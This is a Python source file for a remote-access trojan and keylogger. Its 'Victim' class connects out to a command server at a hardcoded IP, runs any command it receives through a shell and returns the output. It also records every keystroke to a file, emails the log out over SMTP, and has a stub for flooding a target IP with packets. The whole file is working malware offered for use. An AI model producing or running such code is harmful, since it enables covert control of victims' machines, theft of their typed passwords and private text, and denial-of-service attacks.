import smtplib
import os
import getpass
import socket
import time
import psutil
import subprocess
import ast
import winreg

from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import keyboard


class EmailSender:
    def __init__(self, smtp_server, smtp_port, username, password):
        self.smtp_server = smtp_server
        self.smtp_port = smtp_port
        self.username = username
        self.password = password

    def send_email_with_attachment(self, subject, message, attachment_path, recipients):
        # Create a multipart message
        msg = MIMEMultipart()
        msg['From'] = self.username
        msg['To'] = ", ".join(recipients)
        msg['Subject'] = subject

        # Add message body
        msg.attach(MIMEText(message, 'plain'))

        # Add attachment
        attachment_filename = os.path.basename(attachment_path)
        with open(attachment_path, "rb") as attachment_file:
            part = MIMEBase('application', 'octet-stream')
            part.set_payload(attachment_file.read())
            encoders.encode_base64(part)
            part.add_header('Content-Disposition', f"attachment; filename= {attachment_filename}")
            msg.attach(part)

        # Send the email
        try:
            with smtplib.SMTP(self.smtp_server, self.smtp_port) as server:
                server.login(self.username, self.password)
                server.send_message(msg)
            print("Email sent successfully!")
        except smtplib.SMTPException as e:
            print("Failed to send email. Error:", str(e))


class Victim:
    def __init__(self, server_ip, server_port, email_address, password):
        self.server_ip = server_ip
        self.server_port = server_port
        self.client = None
        self.email_address = email_address
        self.password = password

    def connect_to_server(self):
        self.client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        print("Msg: Client initiated...")
        try:
            self.client.connect((self.server_ip, self.server_port))
            print("Msg: Connection established.")
        except ConnectionRefusedError:
            print("Failed to connect to the server.")

    def online_interaction(self):
        while True:
            print("[+] Awaiting shell commands...")
            user_command = self.client.recv(1024).decode()

            if user_command.strip() == "exit":
                break

            if user_command.startswith("Attack"):
                command_parts = user_command.split()
                if len(command_parts) == 2:
                    ip_address = command_parts[1]
                    self.send_packets(ip_address)
            else:
                output = self.execute_shell_command(user_command)
                print("[+] Sending command output...")
                self.client.send(output.encode())

    def execute_shell_command(self, command):
        try:
            process = subprocess.Popen(command, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
            output = process.stdout.read()
            error = process.stderr.read()
            if output or error:
                return output + error
            else:
                return "No visible output."
        except subprocess.CalledProcessError as e:
            return str(e)

    def send_email_with_keystrokes(self, keystrokes):
        if not self.email_address or not self.password:
            print("Please set the email address and password before sending the email.")
            return

        smtp_server, smtp_port = self.get_smtp_server_info()

        email_sender = EmailSender(smtp_server, smtp_port, self.email_address, self.password)

        subject = 'Keystrokes Data'
        message = keystrokes

        recipients = [self.email_address]

        email_sender.send_email_with_attachment(subject, message, "keystrokes.txt", recipients)

    def monitor_keystrokes(self):
        keyboard.on_release(self.add_keystroke)
        keyboard.wait()

    def add_keystroke(self, event):
        keystrokes_file = open("keystrokes.txt", "a")
        keystrokes_file.write(event.name + "\n")
        keystrokes_file.close()

    def get_smtp_server_info(self):
        try:
            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, 'SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders') as key:
                appdata = winreg.QueryValueEx(key, 'AppData')[0]
                credentials_path = os.path.join(appdata, 'credentials.txt')

            with open(credentials_path, 'r') as credentials_file:
                credentials = ast.literal_eval(credentials_file.read())

            return credentials['smtp_server'], credentials['smtp_port']
        except (FileNotFoundError, KeyError, ValueError):
            return '', ''

    def send_packets(self, ip_address):
        print(f"Attacking {ip_address}...")
        # Implement your code for sending packets to the target IP address here

        # Example code for sending packets
        # packet = IP(dst=ip_address) / ICMP()
        # send(packet, loop=1, inter=0.2)

        print("Attack completed.")

    def start(self):
        self.connect_to_server()
        if self.client:
            self.online_interaction()


if __name__ == "__main__":
    server_ip = "192.168.0.100"  # Replace with the actual server IP address
    server_port = 12345  # Replace with the actual server port

    email_address = "your-email@example.com"  # Replace with your email address
    password = getpass.getpass("Enter email password: ")

    victim = Victim(server_ip, server_port, email_address, password)

    # Start monitoring keystrokes in a separate thread
    keystroke_monitor_thread = threading.Thread(target=victim.monitor_keystrokes)
    keystroke_monitor_thread.daemon = True
    keystroke_monitor_thread.start()

    victim.start()
